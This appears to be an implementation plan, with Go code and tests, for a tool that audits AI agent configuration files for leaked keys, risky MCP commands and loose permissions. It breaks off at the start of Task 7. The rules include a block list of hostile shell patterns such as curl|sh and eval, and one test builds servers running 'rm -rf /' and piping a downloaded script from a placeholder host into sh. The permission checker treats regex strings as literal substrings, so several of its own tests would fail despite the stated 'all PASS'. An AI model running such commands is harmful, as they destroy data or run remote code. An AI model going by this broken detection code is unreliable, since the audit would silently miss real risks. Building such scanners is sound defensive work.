# agent-audit Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a production-quality Go TUI application that audits AI agent configurations in software projects, detecting tools, MCP servers, skills, security issues, and misconfigurations.

**Architecture:** A plugin-style scanner architecture where each AI ecosystem implements a common `Scanner` interface, scanners run concurrently via a worker-pool orchestrator, results feed into a Bubble Tea TUI with six tabbed views, and optional JSON/Markdown/HTML export bypasses the TUI entirely.

**Tech Stack:** Go 1.22+, github.com/charmbracelet/bubbletea, github.com/charmbracelet/bubbles, github.com/charmbracelet/lipgloss, github.com/BurntSushi/toml, gopkg.in/yaml.v3

## Global Constraints

- `go 1.22` in go.mod; use `go get` to resolve latest patch versions of dependencies
- Cross-platform: Linux, macOS, Windows — use `filepath.Join` everywhere, no hardcoded `/`
- Secret values NEVER displayed in full; mask as `sk-************abcd` (first 3 + last 4 chars)
- Severity constants exactly: `"INFO"`, `"WARNING"`, `"CRITICAL"`
- CLI: `agent-audit [path]` defaults to TUI; `--json`, `--markdown`, `--html` skip TUI and write `report.{json,md,html}`
- Scanner interface must stay stable; new ecosystems added by implementing `Scanner` only
- Test coverage target >80%; all tests pass with `go test ./...`
- Module path: `github.com/skromesch/agent-audit`

---

## File Map

```
cmd/agent-audit/main.go              CLI entry point, flag parsing, mode dispatch
internal/model/types.go              All shared types: Finding, Severity, MCPServer, Skill, AgentConfig, ScanResult
internal/rules/secrets.go            Secret detection + masking
internal/rules/secrets_test.go
internal/rules/commands.go           Dangerous command detection
internal/rules/commands_test.go
internal/rules/permissions.go        Permission/sandbox risk detection
internal/rules/permissions_test.go
internal/scanner/scanner.go          Scanner interface + ScannerResult + Orchestrator
internal/scanner/claude.go           Claude Code scanner
internal/scanner/claude_test.go
internal/scanner/codex.go            Codex scanner
internal/scanner/codex_test.go
internal/scanner/cursor.go           Cursor scanner
internal/scanner/cursor_test.go
internal/scanner/continue.go         Continue.dev scanner
internal/scanner/continue_test.go
internal/scanner/aider.go            Aider scanner
internal/scanner/aider_test.go
internal/scanner/mcp.go              MCP server scanner
internal/scanner/mcp_test.go
internal/scanner/skills.go           Skills scanner
internal/scanner/skills_test.go
internal/scanner/orchestrator_test.go
internal/scanner/integration_test.go End-to-end fixture scan
internal/scanner/bench_test.go       Benchmark tests
internal/report/json.go              JSON report generator
internal/report/json_test.go
internal/report/markdown.go          Markdown report generator
internal/report/markdown_test.go
internal/report/html.go              HTML report generator
internal/report/html_test.go
internal/tui/styles.go               Lipgloss palette + component styles
internal/tui/app.go                  Main Bubble Tea model, tab routing, keyboard handling
internal/tui/overview.go             Overview tab
internal/tui/agents.go               Agents tab
internal/tui/mcpview.go              MCP tab
internal/tui/skillsview.go           Skills tab
internal/tui/security.go             Security tab
internal/tui/filesview.go            Files tab
internal/fixtures/sample-project/    Full fixture directory tree (see Task 9)
go.mod
Makefile
.golangci.yml
.github/workflows/ci.yml
README.md
docs/architecture.md
```

---

### Task 1: Project Scaffolding

**Files:**
- Create: `go.mod`
- Create: `Makefile`
- Create: `.golangci.yml`
- Create: `.github/workflows/ci.yml`

**Interfaces:**
- Produces: working `go build ./...`, `make test`, `make lint` commands

- [ ] **Step 1: Initialize module and fetch dependencies**

```bash
cd /path/to/agent-audit
go mod init github.com/skromesch/agent-audit
go get github.com/charmbracelet/bubbletea@latest
go get github.com/charmbracelet/bubbles@latest
go get github.com/charmbracelet/lipgloss@latest
go get github.com/BurntSushi/toml@latest
go get gopkg.in/yaml.v3@latest
```

- [ ] **Step 2: Write Makefile**

```makefile
.PHONY: build test lint clean install

BINARY := agent-audit
CMD := ./cmd/agent-audit

build:
	go build -o $(BINARY) $(CMD)

install:
	go install $(CMD)

test:
	go test -race -coverprofile=coverage.out ./...
	go tool cover -func=coverage.out | grep total

lint:
	golangci-lint run ./...

bench:
	go test -bench=. -benchmem ./...

clean:
	rm -f $(BINARY) coverage.out report.json report.md report.html

.DEFAULT_GOAL := build
```

- [ ] **Step 3: Write .golangci.yml**

```yaml
linters:
  enable:
    - errcheck
    - gosimple
    - govet
    - ineffassign
    - staticcheck
    - unused
    - gofmt
    - goimports
    - misspell
    - revive

linters-settings:
  revive:
    rules:
      - name: exported

issues:
  exclude-rules:
    - path: _test\.go
      linters:
        - errcheck
```

- [ ] **Step 4: Write .github/workflows/ci.yml**

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        go: ["1.22"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: ${{ matrix.go }}
      - run: go test -race ./...

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: "1.22"
      - uses: golangci/golangci-lint-action@v6
        with:
          version: latest
```

- [ ] **Step 5: Verify build scaffolding compiles**

```bash
go build ./...
```

Expected: no errors (no Go files yet, just module structure).

- [ ] **Step 6: Commit**

```bash
git init
git add go.mod go.sum Makefile .golangci.yml .github/
git commit -m "chore: project scaffolding with CI and lint config"
```

---

### Task 2: Core Model Types

**Files:**
- Create: `internal/model/types.go`

**Interfaces:**
- Produces: `model.Finding`, `model.Severity`, `model.MCPServer`, `model.Skill`, `model.AgentConfig`, `model.ScanResult` — used by every other package

- [ ] **Step 1: Write internal/model/types.go**

```go
package model

import "time"

type Severity string

const (
	SeverityInfo     Severity = "INFO"
	SeverityWarning  Severity = "WARNING"
	SeverityCritical Severity = "CRITICAL"
)

type Finding struct {
	Tool        string            `json:"tool"`
	Category    string            `json:"category"`
	Scope       string            `json:"scope"`
	Path        string            `json:"path"`
	Severity    Severity          `json:"severity"`
	Description string            `json:"description"`
	Details     map[string]string `json:"details,omitempty"`
}

type MCPServer struct {
	Name    string            `json:"name"`
	Command string            `json:"command"`
	Args    []string          `json:"args"`
	Env     map[string]string `json:"env"`
	Source  string            `json:"source"`
}

type Skill struct {
	Name        string   `json:"name"`
	Description string   `json:"description"`
	Path        string   `json:"path"`
	EntryPoint  string   `json:"entry_point"`
	Valid        bool     `json:"valid"`
	Issues      []string `json:"issues,omitempty"`
}

type AgentConfig struct {
	Tool        string            `json:"tool"`
	ConfigFiles []string          `json:"config_files"`
	Settings    map[string]string `json:"settings"`
}

type ScanResult struct {
	Root        string        `json:"root"`
	ScannedAt   time.Time     `json:"scanned_at"`
	Agents      []AgentConfig `json:"agents"`
	MCPServers  []MCPServer   `json:"mcp_servers"`
	Skills      []Skill       `json:"skills"`
	Findings    []Finding     `json:"findings"`
	ConfigFiles []string      `json:"config_files"`
}

func (r *ScanResult) CriticalCount() int {
	n := 0
	for _, f := range r.Findings {
		if f.Severity == SeverityCritical {
			n++
		}
	}
	return n
}

func (r *ScanResult) WarningCount() int {
	n := 0
	for _, f := range r.Findings {
		if f.Severity == SeverityWarning {
			n++
		}
	}
	return n
}
```

- [ ] **Step 2: Verify package compiles**

```bash
go build ./internal/model/...
```

Expected: exit 0

- [ ] **Step 3: Commit**

```bash
git add internal/model/
git commit -m "feat: core model types"
```

---

### Task 3: Security Rules

**Files:**
- Create: `internal/rules/secrets.go`
- Create: `internal/rules/secrets_test.go`
- Create: `internal/rules/commands.go`
- Create: `internal/rules/commands_test.go`
- Create: `internal/rules/permissions.go`
- Create: `internal/rules/permissions_test.go`

**Interfaces:**
- Consumes: `model.Finding`, `model.Severity`, `model.MCPServer`
- Produces:
  - `rules.ScanForSecrets(path, content string) []model.Finding`
  - `rules.MaskSecret(value string) string`
  - `rules.CheckMCPCommands(server model.MCPServer) []model.Finding`
  - `rules.CheckPermissions(tool, path, content string) []model.Finding`

- [ ] **Step 1: Write failing tests for secret detection**

```go
// internal/rules/secrets_test.go
package rules_test

import (
	"testing"
	"github.com/skromesch/agent-audit/internal/rules"
	"github.com/skromesch/agent-audit/internal/model"
)

func TestScanForSecrets(t *testing.T) {
	tests := []struct {
		name     string
		content  string
		wantHits int
		wantSev  model.Severity
	}{
		{
			name:     "openai key",
			content:  `OPENAI_API_KEY=sk-proj-abc123def456ghi789jkl`,
			wantHits: 1,
			wantSev:  model.SeverityCritical,
		},
		{
			name:     "anthropic key",
			content:  `ANTHROPIC_API_KEY=sk-ant-api03-abcdefghijklmnop`,
			wantHits: 1,
			wantSev:  model.SeverityCritical,
		},
		{
			name:     "github token",
			content:  `GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz123456`,
			wantHits: 1,
			wantSev:  model.SeverityCritical,
		},
		{
			name:     "no secrets",
			content:  `model = "gpt-4"`,
			wantHits: 0,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := rules.ScanForSecrets("config.json", tt.content)
			if len(findings) != tt.wantHits {
				t.Errorf("got %d findings, want %d", len(findings), tt.wantHits)
			}
			if tt.wantHits > 0 && findings[0].Severity != tt.wantSev {
				t.Errorf("severity = %s, want %s", findings[0].Severity, tt.wantSev)
			}
		})
	}
}

func TestMaskSecret(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{"sk-proj-abc123def456", "sk-************f456"},
		{"short", "shor************hort"},
		{"ab", "ab************ab"},
	}
	for _, c := range cases {
		got := rules.MaskSecret(c.in)
		if got == c.in {
			t.Errorf("MaskSecret(%q) returned unmasked value", c.in)
		}
	}
}
```

- [ ] **Step 2: Run tests — verify they fail**

```bash
go test ./internal/rules/... 2>&1 | head -5
```

Expected: `cannot find package` or compile error

- [ ] **Step 3: Write internal/rules/secrets.go**

```go
package rules

import (
	"fmt"
	"regexp"
	"github.com/skromesch/agent-audit/internal/model"
)

var secretPatterns = []struct {
	name    string
	pattern *regexp.Regexp
}{
	{"OpenAI API Key", regexp.MustCompile(`(?i)(OPENAI_API_KEY\s*[=:]\s*)(sk-[a-zA-Z0-9\-_]{20,})`)},
	{"Anthropic API Key", regexp.MustCompile(`(?i)(ANTHROPIC_API_KEY\s*[=:]\s*)(sk-ant-[a-zA-Z0-9\-_]{20,})`)},
	{"GitHub Token", regexp.MustCompile(`(?i)(GITHUB_TOKEN\s*[=:]\s*)(gh[ps]_[a-zA-Z0-9]{36,})`)},
	{"Generic API Key", regexp.MustCompile(`(?i)([a-zA-Z_]{3,}_(?:API_KEY|TOKEN|SECRET|PASSWORD)\s*[=:]\s*)([a-zA-Z0-9\-_]{16,})`)},
}

func ScanForSecrets(path, content string) []model.Finding {
	var findings []model.Finding
	for _, sp := range secretPatterns {
		matches := sp.pattern.FindAllStringSubmatch(content, -1)
		for _, m := range matches {
			if len(m) < 3 {
				continue
			}
			masked := MaskSecret(m[2])
			findings = append(findings, model.Finding{
				Tool:        "security",
				Category:    "secrets",
				Scope:       "project",
				Path:        path,
				Severity:    model.SeverityCritical,
				Description: fmt.Sprintf("%s detected in config file", sp.name),
				Details:     map[string]string{"masked_value": masked},
			})
		}
	}
	return findings
}

func MaskSecret(value string) string {
	if len(value) <= 7 {
		return value[:2] + "************" + value[len(value)-2:]
	}
	prefix := value[:3]
	suffix := value[len(value)-4:]
	return prefix + "************" + suffix
}
```

- [ ] **Step 4: Write internal/rules/commands.go**

```go
package rules

import (
	"fmt"
	"strings"
	"github.com/skromesch/agent-audit/internal/model"
)

var dangerousPatterns = []struct {
	pattern string
	reason  string
}{
	{"rm ", "destructive file removal"},
	{"sudo", "privilege escalation"},
	{"curl | sh", "remote code execution via pipe"},
	{"curl|sh", "remote code execution via pipe"},
	{"wget | sh", "remote code execution via pipe"},
	{"wget|sh", "remote code execution via pipe"},
	{"chmod 777", "world-writable permissions"},
	{"eval $(", "arbitrary code execution"},
	{"|bash", "piped shell execution"},
	{"|sh", "piped shell execution"},
}

func CheckMCPCommands(server model.MCPServer) []model.Finding {
	var findings []model.Finding
	combined := server.Command + " " + strings.Join(server.Args, " ")
	for _, dp := range dangerousPatterns {
		if strings.Contains(combined, dp.pattern) {
			findings = append(findings, model.Finding{
				Tool:        "security",
				Category:    "dangerous-commands",
				Scope:       "project",
				Path:        server.Source,
				Severity:    model.SeverityWarning,
				Description: fmt.Sprintf("MCP server %q uses %s (%s)", server.Name, dp.pattern, dp.reason),
				Details:     map[string]string{"command": combined, "server": server.Name},
			})
		}
	}
	return findings
}
```

- [ ] **Step 5: Write internal/rules/permissions.go**

```go
package rules

import (
	"fmt"
	"strings"
	"github.com/skromesch/agent-audit/internal/model"
)

type permCheck struct {
	keyword  string
	desc     string
	severity model.Severity
}

var permChecks = []permCheck{
	{"approval_mode.*none", "Approval mode disabled — all actions auto-approved", model.SeverityCritical},
	{"\"allow\":\\s*\\[\"\\*\"\\]", "Wildcard allow permission — unrestricted tool access", model.SeverityCritical},
	{"sandbox.*false", "Sandbox disabled in agent config", model.SeverityWarning},
	{"allow_all.*true", "allow_all flag set to true", model.SeverityWarning},
	{"shell.*unrestricted", "Unrestricted shell execution enabled", model.SeverityCritical},
}

func CheckPermissions(tool, path, content string) []model.Finding {
	var findings []model.Finding
	lower := strings.ToLower(content)
	for _, pc := range permChecks {
		if strings.Contains(lower, strings.ToLower(pc.keyword)) {
			findings = append(findings, model.Finding{
				Tool:        tool,
				Category:    "permissions",
				Scope:       "project",
				Path:        path,
				Severity:    pc.severity,
				Description: fmt.Sprintf("[%s] %s", tool, pc.desc),
				Details:     map[string]string{"file": path},
			})
		}
	}
	return findings
}
```

- [ ] **Step 6: Write internal/rules/commands_test.go**

```go
package rules_test

import (
	"testing"
	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

func TestCheckMCPCommands(t *testing.T) {
	tests := []struct {
		name     string
		server   model.MCPServer
		wantHits int
	}{
		{
			name:     "safe server",
			server:   model.MCPServer{Name: "safe", Command: "node", Args: []string{"server.js"}, Source: "mcp.json"},
			wantHits: 0,
		},
		{
			name:     "rm command",
			server:   model.MCPServer{Name: "danger", Command: "rm", Args: []string{"-rf", "/"}, Source: "mcp.json"},
			wantHits: 1,
		},
		{
			name:     "curl pipe sh",
			server:   model.MCPServer{Name: "bad", Command: "curl", Args: []string{"http://example.com/install.sh", "|sh"}, Source: "mcp.json"},
			wantHits: 1,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := rules.CheckMCPCommands(tt.server)
			if len(findings) != tt.wantHits {
				t.Errorf("got %d findings, want %d", len(findings), tt.wantHits)
			}
		})
	}
}
```

- [ ] **Step 7: Write internal/rules/permissions_test.go**

```go
package rules_test

import (
	"testing"
	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

func TestCheckPermissions(t *testing.T) {
	tests := []struct {
		name     string
		content  string
		wantHits int
		wantSev  model.Severity
	}{
		{
			name:     "wildcard allow",
			content:  `{"allow": ["*"]}`,
			wantHits: 1,
			wantSev:  model.SeverityCritical,
		},
		{
			name:     "sandbox disabled",
			content:  `sandbox = false`,
			wantHits: 1,
			wantSev:  model.SeverityWarning,
		},
		{
			name:     "safe config",
			content:  `{"model": "claude-opus-4-5"}`,
			wantHits: 0,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := rules.CheckPermissions("test", "config.json", tt.content)
			if len(findings) != tt.wantHits {
				t.Errorf("got %d findings, want %d", len(findings), tt.wantHits)
			}
			if tt.wantHits > 0 && findings[0].Severity != tt.wantSev {
				t.Errorf("severity = %s, want %s", findings[0].Severity, tt.wantSev)
			}
		})
	}
}
```

- [ ] **Step 8: Run tests — verify they pass**

```bash
go test ./internal/rules/... -v
```

Expected: all PASS

- [ ] **Step 9: Commit**

```bash
git add internal/rules/
git commit -m "feat: security rules — secrets, dangerous commands, permissions"
```

---

### Task 4: Scanner Interface and Orchestrator

**Files:**
- Create: `internal/scanner/scanner.go`
- Create: `internal/scanner/orchestrator_test.go`

**Interfaces:**
- Produces:
  - `scanner.Scanner` interface
  - `scanner.ScannerResult` struct
  - `scanner.Orchestrator` struct with `Run(ctx, root) (*model.ScanResult, error)`

- [ ] **Step 1: Write failing test for orchestrator**

```go
// internal/scanner/orchestrator_test.go
package scanner_test

import (
	"context"
	"testing"
	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/scanner"
)

type stubScanner struct {
	name     string
	findings []model.Finding
}

func (s *stubScanner) Name() string { return s.name }
func (s *stubScanner) Scan(_ context.Context, _ string) (*scanner.ScannerResult, error) {
	return &scanner.ScannerResult{Findings: s.findings}, nil
}

func TestOrchestratorMergesResults(t *testing.T) {
	scanners := []scanner.Scanner{
		&stubScanner{name: "a", findings: []model.Finding{{Tool: "a", Severity: model.SeverityInfo}}},
		&stubScanner{name: "b", findings: []model.Finding{{Tool: "b", Severity: model.SeverityWarning}}},
	}
	orch := scanner.NewOrchestrator(scanners)
	result, err := orch.Run(context.Background(), ".")
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Findings) != 2 {
		t.Errorf("got %d findings, want 2", len(result.Findings))
	}
}
```

- [ ] **Step 2: Run — verify fail**

```bash
go test ./internal/scanner/... 2>&1 | head -5
```

Expected: compile error

- [ ] **Step 3: Write internal/scanner/scanner.go**

```go
package scanner

import (
	"context"
	"sync"
	"time"

	"github.com/skromesch/agent-audit/internal/model"
)

// Scanner discovers agent configuration in a directory tree.
type Scanner interface {
	Name() string
	Scan(ctx context.Context, root string) (*ScannerResult, error)
}

// ScannerResult is the output of a single scanner run.
type ScannerResult struct {
	Agent      *model.AgentConfig
	MCPServers []model.MCPServer
	Skills     []model.Skill
	Findings   []model.Finding
	Files      []string
}

// Orchestrator runs multiple scanners concurrently.
type Orchestrator struct {
	scanners []Scanner
}

func NewOrchestrator(scanners []Scanner) *Orchestrator {
	return &Orchestrator{scanners: scanners}
}

func (o *Orchestrator) Run(ctx context.Context, root string) (*model.ScanResult, error) {
	result := &model.ScanResult{
		Root:      root,
		ScannedAt: time.Now(),
	}

	type outcome struct {
		r   *ScannerResult
		err error
	}

	ch := make(chan outcome, len(o.scanners))
	var wg sync.WaitGroup

	for _, s := range o.scanners {
		wg.Add(1)
		go func(s Scanner) {
			defer wg.Done()
			r, err := s.Scan(ctx, root)
			ch <- outcome{r, err}
		}(s)
	}

	wg.Wait()
	close(ch)

	for out := range ch {
		if out.err != nil {
			continue // non-fatal: one scanner failure doesn't abort
		}
		r := out.r
		if r.Agent != nil {
			result.Agents = append(result.Agents, *r.Agent)
		}
		result.MCPServers = append(result.MCPServers, r.MCPServers...)
		result.Skills = append(result.Skills, r.Skills...)
		result.Findings = append(result.Findings, r.Findings...)
		result.ConfigFiles = append(result.ConfigFiles, r.Files...)
	}

	return result, nil
}
```

- [ ] **Step 4: Run tests — verify pass**

```bash
go test ./internal/scanner/... -run TestOrchestrator -v
```

Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/scanner.go internal/scanner/orchestrator_test.go
git commit -m "feat: scanner interface and concurrent orchestrator"
```

---

### Task 5: Claude Code Scanner

**Files:**
- Create: `internal/scanner/claude.go`
- Create: `internal/scanner/claude_test.go`

**Interfaces:**
- Consumes: `scanner.Scanner`, `scanner.ScannerResult`, `model.*`, `rules.*`
- Produces: `scanner.ClaudeScanner` (implements `scanner.Scanner`)

- [ ] **Step 1: Write failing test**

```go
// internal/scanner/claude_test.go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"github.com/skromesch/agent-audit/internal/scanner"
)

func TestClaudeScannerDetectsConfig(t *testing.T) {
	dir := t.TempDir()

	// Create CLAUDE.md
	os.WriteFile(filepath.Join(dir, "CLAUDE.md"), []byte("# Project instructions"), 0644)

	// Create .claude/settings.json
	claudeDir := filepath.Join(dir, ".claude")
	os.MkdirAll(claudeDir, 0755)
	os.WriteFile(filepath.Join(claudeDir, "settings.json"), []byte(`{
		"model": "claude-opus-4-5",
		"permissions": {"allow": ["bash"], "deny": []}
	}`), 0644)

	s := scanner.NewClaudeScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if result.Agent == nil {
		t.Fatal("expected agent config, got nil")
	}
	if result.Agent.Tool != "Claude Code" {
		t.Errorf("tool = %q, want %q", result.Agent.Tool, "Claude Code")
	}
	if len(result.Files) < 2 {
		t.Errorf("expected at least 2 config files, got %d", len(result.Files))
	}
}

func TestClaudeScannerDetectsSecrets(t *testing.T) {
	dir := t.TempDir()
	claudeDir := filepath.Join(dir, ".claude")
	os.MkdirAll(claudeDir, 0755)
	os.WriteFile(filepath.Join(claudeDir, "settings.json"), []byte(`{
		"env": {"ANTHROPIC_API_KEY": "sk-ant-api03-realkey123456789abcdef"}
	}`), 0644)

	s := scanner.NewClaudeScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	var secretFindings int
	for _, f := range result.Findings {
		if f.Category == "secrets" {
			secretFindings++
		}
	}
	if secretFindings == 0 {
		t.Error("expected secret finding, got none")
	}
}
```

- [ ] **Step 2: Run — verify fail**

```bash
go test ./internal/scanner/... -run TestClaude 2>&1 | head -5
```

Expected: compile error

- [ ] **Step 3: Write internal/scanner/claude.go**

```go
package scanner

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"

	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

type ClaudeScanner struct{}

func NewClaudeScanner() *ClaudeScanner { return &ClaudeScanner{} }

func (s *ClaudeScanner) Name() string { return "Claude Code" }

func (s *ClaudeScanner) Scan(ctx context.Context, root string) (*ScannerResult, error) {
	result := &ScannerResult{}

	candidates := []string{
		filepath.Join(root, "CLAUDE.md"),
		filepath.Join(root, ".claude", "settings.json"),
		filepath.Join(root, ".mcp.json"),
	}

	// Also check user-level settings
	if home, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates,
			filepath.Join(home, ".claude", "settings.json"),
		)
	}

	cfg := &model.AgentConfig{Tool: "Claude Code", Settings: map[string]string{}}
	found := false

	for _, path := range candidates {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		found = true
		result.Files = append(result.Files, path)
		cfg.ConfigFiles = append(cfg.ConfigFiles, path)
		content := string(data)

		// Secret scan
		result.Findings = append(result.Findings, rules.ScanForSecrets(path, content)...)
		// Permission scan
		result.Findings = append(result.Findings, rules.CheckPermissions("Claude Code", path, content)...)

		// Parse settings for summary
		if filepath.Base(path) == "settings.json" {
			var raw map[string]json.RawMessage
			if json.Unmarshal(data, &raw) == nil {
				if m, ok := raw["model"]; ok {
					var model string
					if json.Unmarshal(m, &model) == nil {
						cfg.Settings["model"] = model
					}
				}
			}
		}
	}

	// Skills discovery
	skillsDir := filepath.Join(root, ".claude", "skills")
	if entries, err := os.ReadDir(skillsDir); err == nil {
		for _, e := range entries {
			if e.IsDir() {
				skillPath := filepath.Join(skillsDir, e.Name())
				skill := scanSkillDir(skillPath, e.Name())
				result.Skills = append(result.Skills, skill)
				result.Files = append(result.Files, skillPath)
			}
		}
	}

	if found {
		result.Agent = cfg
	}
	return result, nil
}
```

- [ ] **Step 4: Add scanSkillDir helper to internal/scanner/skills.go (Task 11 will expand this)**

```go
// internal/scanner/skills.go (stub — Task 11 fills this out)
package scanner

import (
	"os"
	"path/filepath"
	"github.com/skromesch/agent-audit/internal/model"
)

func scanSkillDir(path, name string) model.Skill {
	skill := model.Skill{Name: name, Path: path, Valid: false}
	mdPath := filepath.Join(path, "skill.md")
	if data, err := os.ReadFile(mdPath); err == nil {
		skill.Valid = true
		skill.EntryPoint = mdPath
		// Extract description from first non-empty line after frontmatter
		skill.Description = extractFirstLine(string(data))
	} else {
		skill.Issues = append(skill.Issues, "missing skill.md")
	}
	return skill
}

func extractFirstLine(content string) string {
	for _, line := range splitLines(content) {
		if len(line) > 2 && line[:2] != "--" {
			return line
		}
	}
	return ""
}

func splitLines(s string) []string {
	var lines []string
	start := 0
	for i, c := range s {
		if c == '\n' {
			lines = append(lines, s[start:i])
			start = i + 1
		}
	}
	if start < len(s) {
		lines = append(lines, s[start:])
	}
	return lines
}
```

- [ ] **Step 5: Run tests — verify pass**

```bash
go test ./internal/scanner/... -run TestClaude -v
```

Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add internal/scanner/claude.go internal/scanner/claude_test.go internal/scanner/skills.go
git commit -m "feat: Claude Code scanner with secret and permission detection"
```

---

### Task 6: Codex Scanner

**Files:**
- Create: `internal/scanner/codex.go`
- Create: `internal/scanner/codex_test.go`

**Interfaces:**
- Consumes: `scanner.Scanner`, `model.*`, `rules.*`, `github.com/BurntSushi/toml`
- Produces: `scanner.CodexScanner`

- [ ] **Step 1: Write failing test**

```go
// internal/scanner/codex_test.go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"github.com/skromesch/agent-audit/internal/scanner"
)

func TestCodexScannerDetectsConfig(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "AGENTS.md"), []byte("# Codex instructions"), 0644)
	codexDir := filepath.Join(dir, ".codex")
	os.MkdirAll(codexDir, 0755)
	os.WriteFile(filepath.Join(codexDir, "config.toml"), []byte(`
[profile.default]
model = "o3"
approval = "suggest"
`), 0644)

	s := scanner.NewCodexScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if result.Agent == nil {
		t.Fatal("expected agent, got nil")
	}
	if result.Agent.Settings["model"] != "o3" {
		t.Errorf("model = %q, want %q", result.Agent.Settings["model"], "o3")
	}
}

func TestCodexScannerDetectsDangerousApproval(t *testing.T) {
	dir := t.TempDir()
	codexDir := filepath.Join(dir, ".codex")
	os.MkdirAll(codexDir, 0755)
	os.WriteFile(filepath.Join(codexDir, "config.toml"), []byte(`
[profile.default]
approval = "none"
`), 0644)

	s := scanner.NewCodexScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	var permFindings int
	for _, f := range result.Findings {
		if f.Category == "permissions" {
			permFindings++
		}
	}
	if permFindings == 0 {
		t.Error("expected permission finding for approval=none")
	}
}
```

- [ ] **Step 2: Write internal/scanner/codex.go**

```go
package scanner

import (
	"context"
	"os"
	"path/filepath"

	"github.com/BurntSushi/toml"
	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

type CodexScanner struct{}

func NewCodexScanner() *CodexScanner { return &CodexScanner{} }

func (s *CodexScanner) Name() string { return "Codex" }

type codexConfig struct {
	Profile map[string]struct {
		Model    string `toml:"model"`
		Approval string `toml:"approval"`
		Sandbox  struct {
			Enabled bool `toml:"enabled"`
		} `toml:"sandbox"`
	} `toml:"profile"`
}

func (s *CodexScanner) Scan(ctx context.Context, root string) (*ScannerResult, error) {
	result := &ScannerResult{}

	candidates := []string{
		filepath.Join(root, "AGENTS.md"),
		filepath.Join(root, ".codex", "config.toml"),
	}
	if home, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates, filepath.Join(home, ".codex", "config.toml"))
	}

	cfg := &model.AgentConfig{Tool: "Codex", Settings: map[string]string{}}
	found := false

	for _, path := range candidates {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		found = true
		result.Files = append(result.Files, path)
		cfg.ConfigFiles = append(cfg.ConfigFiles, path)
		content := string(data)

		result.Findings = append(result.Findings, rules.ScanForSecrets(path, content)...)
		result.Findings = append(result.Findings, rules.CheckPermissions("Codex", path, content)...)

		if filepath.Ext(path) == ".toml" {
			var cc codexConfig
			if _, err := toml.Decode(content, &cc); err == nil {
				for profileName, p := range cc.Profile {
					if p.Model != "" {
						cfg.Settings["model."+profileName] = p.Model
					}
					if p.Approval != "" {
						cfg.Settings["approval."+profileName] = p.Approval
					}
				}
			}
		}
	}

	if found {
		result.Agent = cfg
	}
	return result, nil
}
```

- [ ] **Step 3: Run tests**

```bash
go test ./internal/scanner/... -run TestCodex -v
```

Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add internal/scanner/codex.go internal/scanner/codex_test.go
git commit -m "feat: Codex scanner"
```

---

### Task 7: Cursor, Continue.dev, and Aider Scanners

**Files:**
- Create: `internal/scanner/cursor.go`
- Create: `internal/scanner/cursor_test.go`
- Create: `internal/scanner/continue.go`
- Create: `internal/scanner/continue_test.go`
- Create: `internal/scanner/aider.go`
- Create: `internal/scanner/aider_test.go`

**Interfaces:**
- Produces: `scanner.CursorScanner`, `scanner.ContinueScanner`, `scanner.AiderScanner`

- [ ] **Step 1: Write cursor_test.go**

```go
// internal/scanner/cursor_test.go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"github.com/skromesch/agent-audit/internal/scanner"
)

func TestCursorScannerDetectsRules(t *testing.T) {
	dir := t.TempDir()
	rulesDir := filepath.Join(dir, ".cursor", "rules")
	os.MkdirAll(rulesDir, 0755)
	os.WriteFile(filepath.Join(rulesDir, "project.md"), []byte("Always use TypeScript"), 0644)
	os.WriteFile(filepath.Join(dir, ".cursor", "settings.json"), []byte(`{"model": "gpt-4o"}`), 0644)

	s := scanner.NewCursorScanner()
	result, err := s.Scan(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if result.Agent == nil {
		t.Fatal("expected agent")
	}
	if len(result.Files) < 2 {
		t.Errorf("expected >=2 files, got %d", len(result.Files))
	}
}
```

- [ ] **Step 2: Write internal/scanner/cursor.go**

```go
package scanner

import (
	"context"
	"os"
	"path/filepath"

	"github.com/skromesch/agent-audit/internal/model"
	"github.com/skromesch/agent-audit/internal/rules"
)

type CursorScanner struct{}

func NewCursorScanner() *CursorScanner { return &CursorScanner{} }

func (s *CursorScanner) Name() string { return "Cursor" }

